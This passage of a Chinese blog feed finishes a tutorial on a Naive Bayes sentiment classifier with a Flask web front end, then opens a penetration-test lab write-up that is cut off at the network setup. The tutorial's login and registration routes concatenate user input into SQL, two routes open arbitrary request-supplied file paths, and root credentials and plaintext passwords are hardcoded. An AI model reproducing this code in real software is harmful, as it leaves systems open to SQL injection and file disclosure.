review_test = [<span class="hljs-string">&#x27; &#x27;</span>.join(review_to_text(review)) <span class="hljs-keyword">for</span> review <span class="hljs-keyword">in</span> test_review_list]</code></pre>

<p>呈现如下的效果</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210808144300246.png" alt="image-20210808144300246"></p>
<h2 id="训练模型"><a href="#训练模型" class="headerlink" title="训练模型"></a>训练模型</h2><pre><code class="hljs python"><span class="hljs-comment"># 加载语料</span>
review_list, sentiment_list = load_corpus(file_path_pos,file_path_nag)

<span class="hljs-comment"># 将全部语料按1:4分为测试集与训练集</span>
n = <span class="hljs-built_in">len</span>(review_list) // <span class="hljs-number">5</span>
train_review_list, train_sentiment_list = review_list[n:], sentiment_list[n:]
test_review_list, test_sentiment_list = review_list[:n], sentiment_list[:n]

print(<span class="hljs-string">&#x27;训练集数量： &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(train_review_list))))
print(<span class="hljs-string">&#x27;测试集数量： &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(test_review_list))))

<span class="hljs-comment"># 用于训练的评论</span>
review_train = [<span class="hljs-string">&#x27; &#x27;</span>.join(review_to_text(review)) <span class="hljs-keyword">for</span> review <span class="hljs-keyword">in</span> train_review_list] <span class="hljs-comment"># 将句子中的单词重新拼接，形成无停顿词的句子</span>
<span class="hljs-comment"># 对于训练评论对应的好评/差评</span>
sentiment_train = train_sentiment_list

<span class="hljs-comment"># 用于测试的评论</span>
review_test = [<span class="hljs-string">&#x27; &#x27;</span>.join(review_to_text(review)) <span class="hljs-keyword">for</span> review <span class="hljs-keyword">in</span> test_review_list]
print(review_test[:<span class="hljs-number">3</span>])
<span class="hljs-comment"># 对于测试评论对应的好评/差评</span>
sentiment_test = test_sentiment_list

vectorizer = CountVectorizer(max_df=<span class="hljs-number">0.8</span>, min_df=<span class="hljs-number">3</span>)
tfidftransformer = TfidfTransformer()

<span class="hljs-comment"># 先转换成词频矩阵，再计算TFIDF值</span>
tfidf = tfidftransformer.fit_transform(vectorizer.fit_transform(review_train))
<span class="hljs-comment"># 朴素贝叶斯中的多项式分类器，训练模型</span>
clf = MultinomialNB().fit(tfidf, sentiment_train)

<span class="hljs-comment"># 将模型保存pickle文件</span>
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(model_export_path, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> file:
    d = &#123;
        <span class="hljs-string">&quot;clf&quot;</span>: clf,
        <span class="hljs-string">&quot;vectorizer&quot;</span>: vectorizer,
        <span class="hljs-string">&quot;tfidftransformer&quot;</span>: tfidftransformer,
    &#125;
    pickle.dump(d, file)

print(<span class="hljs-string">&quot;训练完成&quot;</span>)</code></pre>



<p>使用测试数据集验证该模型的准确性</p>
<pre><code class="hljs python">count_vec = CountVectorizer(max_df=<span class="hljs-number">0.8</span>, min_df=<span class="hljs-number">3</span>)
tfidf_vec = TfidfTransformer()
<span class="hljs-comment"># 定义Pipeline对全部步骤的流式化封装和管理，可以很方便地使参数集在新数据集（比如测试集）上被重复使用。</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">MNB_Classifier</span>():</span>
    <span class="hljs-keyword">return</span> Pipeline([
        (<span class="hljs-string">&#x27;count_vec&#x27;</span>, count_vec),
        (<span class="hljs-string">&#x27;tfidf_vec&#x27;</span>, tfidf_vec),
        (<span class="hljs-string">&#x27;mnb&#x27;</span>, MultinomialNB())
    ])
mnbc_clf = MNB_Classifier()
<span class="hljs-comment"># 进行训练</span>
mnbc_clf.fit(review_train, sentiment_train)
<span class="hljs-comment"># 测试集准确率</span>
print(<span class="hljs-string">&#x27;测试集准确率： &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(mnbc_clf.score(review_test, sentiment_test)))</code></pre>

<p>准确性可以达到88%，是一个不错的结果</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210808154411255.png" alt="image-20210808154411255"></p>
<h1 id="可视化网页"><a href="#可视化网页" class="headerlink" title="可视化网页"></a>可视化网页</h1><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>将爬取的评论写入数据库，将网页中输入的检测数据和结果写入数据库，以及用户登录账号密码</p>
<p>所以需要三个数据表保存上面提到的三种数据</p>
<p>这里使用脚本一键完成</p>
<pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2021/8/6 22:35</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : db_helper.py</span>

<span class="hljs-keyword">import</span> re
<span class="hljs-keyword">import</span> csv
<span class="hljs-keyword">import</span> random
<span class="hljs-keyword">import</span> pymysql
conn = pymysql.connect(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, user=<span class="hljs-string">&#x27;root&#x27;</span>, password=<span class="hljs-string">&#x27;root&#x27;</span>, port=<span class="hljs-number">3306</span>, db=<span class="hljs-string">&#x27;goods&#x27;</span>,
                       charset=<span class="hljs-string">&#x27;utf8mb4&#x27;</span>)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">createTable</span>():</span>
    sql = <span class="hljs-string">&quot;create table comment(id int primary key auto_increment,comment varchar(800) CHARACTER SET &#x27;utf8&#x27;,type varchar(200) CHARACTER SET &#x27;utf8&#x27;)&quot;</span>
    cur = conn.cursor()
    cur.execute(sql)
    cur.close()

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">createTable1</span>():</span>
    sql = <span class="hljs-string">&quot;create table user(id int primary key auto_increment,username varchar(80),password varchar(200))&quot;</span>
    cur = conn.cursor()
    cur.execute(sql)
    cur.close()


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">createTable2</span>():</span>
    sql = <span class="hljs-string">&quot;create table result(id int primary key auto_increment,comment varchar(800) CHARACTER SET &#x27;utf8&#x27;,type varchar(200) CHARACTER SET &#x27;utf8&#x27;)&quot;</span>
    cur = conn.cursor()
    cur.execute(sql)
    cur.close()

createTable()
createTable1()
createTable2()

<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;手机_nagetive.csv&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;UTF-8&#x27;</span>) <span class="hljs-keyword">as</span> f:
    reader = csv.reader(f)
    <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> reader:
        r = <span class="hljs-string">&#x27;&#x27;</span>.join(row)
        cursor = conn.cursor()
        cursor.execute(<span class="hljs-string">&quot;insert into `comment` values(null, %s, &#x27;差评&#x27;)&quot;</span>,
                       (r.split()[<span class="hljs-number">2</span>]));
        conn.commit()
        cursor.close()
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;手机_positive.csv&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;UTF-8&#x27;</span>) <span class="hljs-keyword">as</span> f:
    reader = csv.reader(f)
    <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> reader:
        r = <span class="hljs-string">&#x27;&#x27;</span>.join(row)
        cursor = conn.cursor()
        cursor.execute(<span class="hljs-string">&quot;insert into `comment` values(null, %s, &#x27;好评&#x27;)&quot;</span>,
                       (r.split()[<span class="hljs-number">2</span>]));

        conn.commit()
        cursor.close()</code></pre>

<h2 id="用户注册和登录"><a href="#用户注册和登录" class="headerlink" title="用户注册和登录"></a>用户注册和登录</h2><p>用户的注册和登录逻辑很简单，就是与数据库进行交互</p>
<pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/addUser&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">addUser</span>():</span>
    get_json = request.get_json()
    name = get_json[<span class="hljs-string">&#x27;name&#x27;</span>]
    password = get_json[<span class="hljs-string">&#x27;password&#x27;</span>]
    conn = pymysql.connect(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, user=<span class="hljs-string">&#x27;root&#x27;</span>, password=<span class="hljs-string">&#x27;root&#x27;</span>, port=<span class="hljs-number">3306</span>, db=<span class="hljs-string">&#x27;goods&#x27;</span>,
                           charset=<span class="hljs-string">&#x27;utf8mb4&#x27;</span>)
    cursor = conn.cursor()
    sql = <span class="hljs-string">&quot;insert into `user` values(null,&#x27;&quot;</span>+name+<span class="hljs-string">&quot;&#x27;,&#x27;&quot;</span>+password+<span class="hljs-string">&quot;&#x27;,&#x27;user&#x27;)&quot;</span>
    cursor.execute(sql);
    conn.commit()
    table_result = &#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">200</span>, <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;成功&quot;</span>&#125;
    cursor.close()
    conn.close()
    <span class="hljs-keyword">return</span> jsonify(table_result)

<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/loginByPassword&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">loginByPassword</span>():</span>
    get_json = request.get_json()
    name = get_json[<span class="hljs-string">&#x27;name&#x27;</span>]
    password = get_json[<span class="hljs-string">&#x27;password&#x27;</span>]
    conn = pymysql.connect(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, user=<span class="hljs-string">&#x27;root&#x27;</span>, password=<span class="hljs-string">&#x27;root&#x27;</span>, port=<span class="hljs-number">3306</span>, db=<span class="hljs-string">&#x27;goods&#x27;</span>,
                           charset=<span class="hljs-string">&#x27;utf8mb4&#x27;</span>)
    cursor = conn.cursor()
    cursor.execute(<span class="hljs-string">&quot;select count(*) from `user` where `username` = &#x27;&quot;</span> + name +<span class="hljs-string">&quot;&#x27; and password = &#x27;&quot;</span> + password+<span class="hljs-string">&quot;&#x27;&quot;</span>);
    count = cursor.fetchall()
    <span class="hljs-keyword">if</span>(count[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] != <span class="hljs-number">0</span>):
        table_result = &#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">200</span>, <span class="hljs-string">&quot;msg&quot;</span>: name&#125;
    <span class="hljs-keyword">else</span>:
        table_result = &#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">500</span>, <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;失败&quot;</span>&#125;
    cursor.close()
    conn.close()
    <span class="hljs-keyword">return</span> jsonify(table_result)</code></pre>

<p>用户成功登录后，js脚本会重定向到index.html页面，进入系统主页</p>
<pre><code class="hljs js">form.on(<span class="hljs-string">&#x27;submit(login-submit)&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">obj</span>) </span>&#123;
            $.ajax(&#123;
                type: <span class="hljs-string">&quot;post&quot;</span>,
                contentType: <span class="hljs-string">&#x27;application/json&#x27;</span>,
                url: <span class="hljs-string">&quot;http://127.0.0.1:5000/loginByPassword&quot;</span>,
                data: <span class="hljs-built_in">JSON</span>.stringify(obj.field),
                dataType: <span class="hljs-string">&#x27;json&#x27;</span>,
                success: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) </span>&#123;
                    <span class="hljs-keyword">if</span> (data.code == <span class="hljs-string">&#x27;200&#x27;</span>) &#123;
                        layer.msg(<span class="hljs-string">&#x27;登录成功&#x27;</span>,
                            &#123;
                                icon: <span class="hljs-number">1</span>,
                                time: <span class="hljs-number">1500</span>
                            &#125;, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;
                                location.replace(<span class="hljs-string">&#x27;../../index.html&#x27;</span>) <span class="hljs-comment">//重定向到index.html</span>
                            &#125;)
                    &#125; <span class="hljs-keyword">else</span> &#123;
                        layer.alert(data.msg, &#123;<span class="hljs-attr">icon</span>: <span class="hljs-number">2</span>&#125;, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">index</span>) </span>&#123;
                            layer.close(index);
                        &#125;);
                    &#125;
                &#125;
            &#125;)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        &#125;);</code></pre>

<h2 id="词云展示"><a href="#词云展示" class="headerlink" title="词云展示"></a>词云展示</h2><p>使用echarts生成词云</p>
<pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/top&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">top</span>():</span>
    jsondata = &#123;&#125;
    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(request.args)!=<span class="hljs-number">0</span>):
        <span class="hljs-keyword">if</span>(request.args[<span class="hljs-string">&#x27;category&#x27;</span>]==<span class="hljs-string">&#x27;good&#x27;</span>):
            jsondata[<span class="hljs-string">&#x27;data&#x27;</span>] = good_datas
        <span class="hljs-keyword">else</span>:
            jsondata[<span class="hljs-string">&#x27;data&#x27;</span>] = bad_datas
    <span class="hljs-keyword">else</span>:
        jsondata[<span class="hljs-string">&#x27;data&#x27;</span>] = all_datas
    j = jsonify(jsondata)
    print(j)
    <span class="hljs-keyword">return</span> j</code></pre>

<p>数据获取</p>
<pre><code class="hljs python">cursor.execute(<span class="hljs-string">&quot;select comment from `comment`&quot;</span>);
data_dict = []
result = cursor.fetchall()
<span class="hljs-keyword">for</span> field <span class="hljs-keyword">in</span> result:
    data_dict.append(field[<span class="hljs-string">&#x27;comment&#x27;</span>])
content = <span class="hljs-string">&#x27;&#x27;</span>.join(data_dict)
all_datas = []
jieba.analyse.set_stop_words(<span class="hljs-string">&#x27;./stopwords.txt&#x27;</span>)
tags = jieba.analyse.extract_tags(content, topK=<span class="hljs-number">100</span>, withWeight=<span class="hljs-literal">True</span>)
<span class="hljs-keyword">for</span> v, n <span class="hljs-keyword">in</span> tags:
    mydict = &#123;&#125;
    mydict[<span class="hljs-string">&quot;name&quot;</span>] = v
    mydict[<span class="hljs-string">&quot;value&quot;</span>] = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(n * <span class="hljs-number">10000</span>))
    all_datas.append(mydict)
cursor.close()</code></pre>

<p>js脚本</p>
<pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">init</span>(<span class="hljs-params"></span>) </span>&#123;
					form.render();
					$.ajax(&#123;
						type: <span class="hljs-string">&#x27;GET&#x27;</span>,
						url: <span class="hljs-string">&#x27;http://127.0.0.1:5000/top&#x27;</span>,
						beforeSend: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">XMLHttpRequest</span>) </span>&#123;
							<span class="hljs-comment">//注意，layer.msg默认3秒自动关闭，如果数据加载耗时比较长，需要设置time</span>
							loadingFlag = layer.msg(<span class="hljs-string">&#x27;正在读取数据，请稍候……&#x27;</span>, &#123;
								icon: <span class="hljs-number">16</span>,
								shade: <span class="hljs-number">0.01</span>,
								shadeClose: <span class="hljs-literal">false</span>,
								time: <span class="hljs-number">60000</span>
							&#125;);
						&#125;,
						success: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">res</span>) </span>&#123;
							<span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;初始化&#x27;</span>)
							layer.close(loadingFlag);
							myCharts2.setOption(&#123;
								tooltip: &#123;
									show: <span class="hljs-literal">true</span>
								&#125;,
								series: [&#123;
									type: <span class="hljs-string">&quot;wordCloud&quot;</span>,
									gridSize: <span class="hljs-number">6</span>,
									shape: <span class="hljs-string">&#x27;diamond&#x27;</span>,
									sizeRange: [<span class="hljs-number">12</span>, <span class="hljs-number">50</span>],
									width: <span class="hljs-number">800</span>,
									height: <span class="hljs-number">500</span>,
									textStyle: &#123;
										normal: &#123;
											color: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;
												<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;rgb(&#x27;</span> + [
													<span class="hljs-built_in">Math</span>.round(<span class="hljs-built_in">Math</span>.random() * <span class="hljs-number">160</span>),
													<span class="hljs-built_in">Math</span>.round(<span class="hljs-built_in">Math</span>.random() * <span class="hljs-number">160</span>),
													<span class="hljs-built_in">Math</span>.round(<span class="hljs-built_in">Math</span>.random() * <span class="hljs-number">160</span>)
												].join(<span class="hljs-string">&#x27;,&#x27;</span>) + <span class="hljs-string">&#x27;)&#x27;</span>;
											&#125;
										&#125;,
										emphasis: &#123;
											shadowBlur: <span class="hljs-number">10</span>,
											shadowColor: <span class="hljs-string">&#x27;#333&#x27;</span>
										&#125;
									&#125;,
									data: res.data,
								&#125;]
							&#125;);</code></pre>



<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210808174107761.png" alt="image-20210808174107761" style="zoom: 67%;">

<h2 id="评论检测"><a href="#评论检测" class="headerlink" title="评论检测"></a>评论检测</h2><p>当用户输入检测文本，系统会调用训练好的模型对文本进行情感分析，并将得到的结果写入数据库，之后在页面中显示</p>
<p>python代码</p>
<pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/data1&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">data1</span>():</span>
    path = <span class="hljs-built_in">str</span>(request.args[<span class="hljs-string">&#x27;path&#x27;</span>])
    data = []
    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(path)==<span class="hljs-number">0</span>):
        table_result = &#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&quot;count&quot;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&quot;data&quot;</span>: data&#125;
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;UTF-8&#x27;</span>) <span class="hljs-keyword">as</span> f:
            reader = f.readlines()
            rows = [row <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> reader]
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> rows:
            result = analyzer.analyze(i)  // 调用已经封装好的模型对提交的文本进行检测，返回结果
            d = &#123;<span class="hljs-string">&quot;content&quot;</span>:i,<span class="hljs-string">&quot;result&quot;</span>:result&#125;
            data.append(d)
        table_result = &#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&quot;count&quot;</span>: <span class="hljs-number">10</span>, <span class="hljs-string">&quot;data&quot;</span>: data&#125;
    <span class="hljs-keyword">return</span> jsonify(table_result)

<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/ksh&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ksh</span>():</span>
    path = <span class="hljs-built_in">str</span>(request.args[<span class="hljs-string">&#x27;path&#x27;</span>])
    good = <span class="hljs-number">0</span>
    bad = <span class="hljs-number">0</span>
    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(path)==<span class="hljs-number">0</span>):
        table_result = &#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&quot;count&quot;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&quot;data&quot;</span>: data&#125;
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;UTF-8&#x27;</span>) <span class="hljs-keyword">as</span> f:
            reader = f.readlines()
            rows = [row <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> reader]
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> rows:
            result = analyzer.analyze(i)
            <span class="hljs-keyword">if</span>(result == <span class="hljs-string">&quot;好评&quot;</span>):
                good+=<span class="hljs-number">1</span>
            <span class="hljs-keyword">else</span>:
                bad+=<span class="hljs-number">1</span>
        table_result = &#123;<span class="hljs-string">&quot;good&quot;</span>: good, <span class="hljs-string">&quot;bad&quot;</span>: bad&#125;
    <span class="hljs-keyword">return</span> jsonify(table_result)
</code></pre>

<p>js脚本</p>
<pre><code class="hljs js"><span class="hljs-keyword">var</span> insTb = table.render(&#123;
	elem: <span class="hljs-string">&#x27;#tableUser&#x27;</span>,
	url: <span class="hljs-string">&#x27;http://127.0.0.1:5000/data&#x27;</span>,
	height: <span class="hljs-string">&#x27;full-250&#x27;</span>,
	page: <span class="hljs-literal">true</span>,
	toolbar: <span class="hljs-literal">true</span>,
	cellMinWidth: <span class="hljs-number">100</span>,
	cols: [
		[&#123;
				type: <span class="hljs-string">&#x27;numbers&#x27;</span>,
				title: <span class="hljs-string">&#x27;#&#x27;</span>
			&#125;,

			&#123;
				field: <span class="hljs-string">&#x27;content&#x27;</span>,
				sort: <span class="hljs-literal">true</span>,
				title: <span class="hljs-string">&#x27;内容&#x27;</span>
			&#125;,
			&#123;
				field: <span class="hljs-string">&#x27;type&#x27;</span>,
				sort: <span class="hljs-literal">true</span>,
				title: <span class="hljs-string">&#x27;分类&#x27;</span>,
				width:<span class="hljs-number">200</span>,
				templet: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">d</span>)</span>&#123;
					<span class="hljs-keyword">if</span>(d.TYPE == <span class="hljs-number">1</span>)&#123;
						<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;好评&#x27;</span>
					&#125;<span class="hljs-keyword">else</span>&#123;
						<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;差评&#x27;</span>
					&#125;
  							&#125;
			&#125;
		]
	]
&#125;);</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210808175218340.png" alt="image-20210808175218340"></p>
<h2 id="批量检测"><a href="#批量检测" class="headerlink" title="批量检测"></a>批量检测</h2><p>批量检测是将多条评论写入txt文件中，实现一次检测多条评论，然后将数据显示在页面中，并呈现可视化结果</p>
<pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/data&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">data</span>():</span>
    limit = <span class="hljs-built_in">int</span>(request.args[<span class="hljs-string">&#x27;limit&#x27;</span>])
    page = <span class="hljs-built_in">int</span>(request.args[<span class="hljs-string">&#x27;page&#x27;</span>])
    page = (page-<span class="hljs-number">1</span>)*limit
    conn = pymysql.connect(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, user=<span class="hljs-string">&#x27;root&#x27;</span>, password=<span class="hljs-string">&#x27;root&#x27;</span>, port=<span class="hljs-number">3306</span>, db=<span class="hljs-string">&#x27;goods&#x27;</span>,
                           charset=<span class="hljs-string">&#x27;utf8mb4&#x27;</span>)
    cursor = conn.cursor()
    cursor.execute(<span class="hljs-string">&quot;select count(*) from `result`&quot;</span>);
    count = cursor.fetchall()
    cursor = conn.cursor(cursor=pymysql.cursors.DictCursor)
    cursor.execute(<span class="hljs-string">&quot;select * from `result` limit &quot;</span>+<span class="hljs-built_in">str</span>(page)+<span class="hljs-string">&quot;,&quot;</span>+<span class="hljs-built_in">str</span>(limit));
    data_dict = []
    result = cursor.fetchall()
    <span class="hljs-keyword">for</span> field <span class="hljs-keyword">in</span> result:
        data_dict.append(field)
    table_result = &#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&quot;count&quot;</span>: count[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;data&quot;</span>: data_dict&#125;
    cursor.close()
    conn.close()
    <span class="hljs-keyword">return</span> jsonify(table_result)</code></pre>

<p>js脚本</p>
<pre><code class="hljs js">upload.render(&#123; <span class="hljs-comment">//允许上传的文件后缀</span>
					elem: <span class="hljs-string">&#x27;#test_upload&#x27;</span>,
					url: <span class="hljs-string">&#x27;http://127.0.0.1:5000/upload&#x27;</span>,
					field: <span class="hljs-string">&#x27;myfile&#x27;</span>,
					accept: <span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-comment">//普通文件		</span>
					exts: <span class="hljs-string">&#x27;txt&#x27;</span>, <span class="hljs-comment">//只允许上传txt文件	</span>
					before: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">obj</span>) </span>&#123; <span class="hljs-comment">//obj参数包含的信息，跟 choose回调完全一致，可参见上文。</span>
						layer.load(); <span class="hljs-comment">//上传loading</span>
					&#125;,
					done: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">res</span>) </span>&#123;
						layer.closeAll(<span class="hljs-string">&#x27;loading&#x27;</span>);
						layer.msg(<span class="hljs-string">&#x27;上传成功&#x27;</span>);
						<span class="hljs-built_in">console</span>.log(res)
						path = res.path
						insTb.reload(&#123;
							where: &#123;
								<span class="hljs-string">&#x27;path&#x27;</span>: path
							&#125;
						&#125;);
						$.ajax(&#123;
							type: <span class="hljs-string">&#x27;GET&#x27;</span>,
							url: <span class="hljs-string">&#x27;http://127.0.0.1:5000/ksh&#x27;</span>,
							data: &#123;
								<span class="hljs-string">&#x27;path&#x27;</span>: path
							&#125;,
							success: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">result</span>) </span>&#123;
								<span class="hljs-keyword">var</span> option = &#123;
									tooltip: &#123;
										trigger: <span class="hljs-string">&#x27;item&#x27;</span>,
										formatter: <span class="hljs-string">&#x27;&#123;a&#125; &lt;br/&gt;&#123;b&#125; : &#123;c&#125; (&#123;d&#125;%)&#x27;</span>
									&#125;,
									legend: &#123;
										orient: <span class="hljs-string">&#x27;vertical&#x27;</span>,
										left: <span class="hljs-string">&#x27;left&#x27;</span>,
										data: [<span class="hljs-string">&#x27;有效评论&#x27;</span>, <span class="hljs-string">&#x27;垃圾评论&#x27;</span>]
									&#125;,
									series: [&#123;
										name: <span class="hljs-string">&#x27;评论比例&#x27;</span>,
										type: <span class="hljs-string">&#x27;pie&#x27;</span>,
										radius: <span class="hljs-string">&#x27;55%&#x27;</span>,
										center: [<span class="hljs-string">&#x27;50%&#x27;</span>, <span class="hljs-string">&#x27;60%&#x27;</span>],
										data: [&#123;
												value: result.good,
												name: <span class="hljs-string">&#x27;有效评论&#x27;</span>
											&#125;,
											&#123;
												value: result.bad,
												name: <span class="hljs-string">&#x27;垃圾评论&#x27;</span>
											&#125;
										],
										emphasis: &#123;
											itemStyle: &#123;
												shadowBlur: <span class="hljs-number">10</span>,
												shadowOffsetX: <span class="hljs-number">0</span>,
												shadowColor: <span class="hljs-string">&#x27;rgba(0, 0, 0, 0.5)&#x27;</span>
											&#125;
										&#125;
									&#125;]
								&#125;;
								myCharts.setOption(option)
							&#125;
						&#125;);</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210808175245654.png" alt="image-20210808175245654"></p>
<p>最后呈现的效果</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210808175722246.png" alt="image-20210808175722246"></p>
<p>参考：</p>
<blockquote>
<p><a href="https://github.com/NTDXYG/ProjectsForChineseGraduates">https://github.com/NTDXYG/ProjectsForChineseGraduates</a></p>
</blockquote>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>朴素贝叶斯</tag>
      </tags>
  </entry>
  <entry>
    <title>shentou</title>
    <url>/2021/05/11/shentou/</url>
    <content><![CDATA[<p>记一次渗透测试</p>
<span id="more"></span>

<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>使用的靶机是红日安全提供的，地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p>
<p>搭建过程中有一点需要注意</p>
<p>Web服务主机win7有两块网卡，需要在设置中再添加一块网卡</p>
<p>网卡一连接到<code>VMnet2</code>中，作为内网环境</p>
<p>网卡二连接到<code>VMnet1</code>中，作为公网环境，并攻击机连到<code>VMnet1</code>中,确保其可以访问网站主页</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511130030032.png" alt="image-20210511130030032"></p>
<p>剩下的两台域控主机直接连接到<code>VMnet2</code>中即可，可以与web服务器通信</p>
<p>修改window10物理机的VMnet1网卡</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511214717086.png" alt="image-20210511214717086" style="zoom:67%;">

<p>这样物理机和kali都可以访问到靶机网站</p>
<p><strong>实验拓扑图:</strong></p>
